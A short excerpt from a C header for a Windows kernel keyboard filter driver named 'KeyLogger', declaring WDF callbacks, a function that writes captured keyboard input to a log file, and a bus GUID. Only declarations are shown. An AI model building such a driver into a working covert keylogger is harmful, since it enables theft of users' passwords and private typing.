...
EVT_WDF_DRIVER_DEVICE_ADD KeyLogger_EvtDeviceAdd;

EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL KeyLogger_EvtIoInternalDeviceControl;
...
NTSTATUS WriteToLogFile(PKEYBOARD_INPUT_DATA keyData, unsigned count);

// IOCTL Related defintions

// Used to identify kbfilter bus. This guid is used as the enumeration string
// for the device id.
DEFINE_GUID(GUID_BUS_KBFILTER, 0xa65c87f9, 0xbe02, 0x4ed9, 0x92, 0xec, 0x1, 0x2d, 0x41, 0x61, 0x69, 0xfa);
